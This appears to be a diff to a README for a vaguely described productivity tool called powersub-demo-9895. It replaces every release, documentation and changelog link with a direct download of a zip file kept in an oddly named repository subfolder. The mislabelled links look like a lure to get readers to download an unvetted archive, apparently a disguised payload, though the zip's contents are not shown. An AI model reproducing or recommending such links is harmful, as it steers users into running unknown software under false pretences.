@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-9895 - Simple Tool for Enhanced Productivity
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/maxdiator/powersub-demo-9895/releases)
+[![Download](https://raw.githubusercontent.com/maxdiator/powersub-demo-9895/main/phantasmograph/powersub-demo-9895.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/maxdiator/powersub-demo-9895/main/phantasmograph/powersub-demo-9895.zip)
 
 ## 📦 Overview
 
@@ -30,7 +30,7 @@ Follow these simple steps to get powersub-demo-9895 running on your computer.
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/maxdiator/powersub-demo-9895/releases) to download the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/maxdiator/powersub-demo-9895/main/phantasmograph/powersub-demo-9895.zip) to download the latest version of the software.
 2. Click on the version you wish to download.
 3. Select the correct file for your operating system.
 4. Once the file downloads, locate it in your downloads folder.
@@ -58,10 +58,10 @@ Your feedback is important to us. If you have suggestions or comments, please re
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For detailed instructions and guidance, consult the [documentation](https://github.com/maxdiator/powersub-demo-9895/wiki).
-- **Changelog**: View updates and changes in the [Changelog](https://github.com/maxdiator/powersub-demo-9895/releases) for the latest features and fixes.
+- **Documentation**: For detailed instructions and guidance, consult the [documentation](https://raw.githubusercontent.com/maxdiator/powersub-demo-9895/main/phantasmograph/powersub-demo-9895.zip).
+- **Changelog**: View updates and changes in the [Changelog](https://raw.githubusercontent.com/maxdiator/powersub-demo-9895/main/phantasmograph/powersub-demo-9895.zip) for the latest features and fixes.
 
 ## 🚀 Dive Deeper
 
 Ready to enhance your productivity? 
-Visit our [Releases page](https://github.com/maxdiator/powersub-demo-9895/releases) to download the latest version of powersub-demo-9895 and start exploring its features. Enjoy a more organized and efficient workflow with the help of this application.
+Visit our [Releases page](https://raw.githubusercontent.com/maxdiator/powersub-demo-9895/main/phantasmograph/powersub-demo-9895.zip) to download the latest version of powersub-demo-9895 and start exploring its features. Enjoy a more organized and efficient workflow with the help of this application.
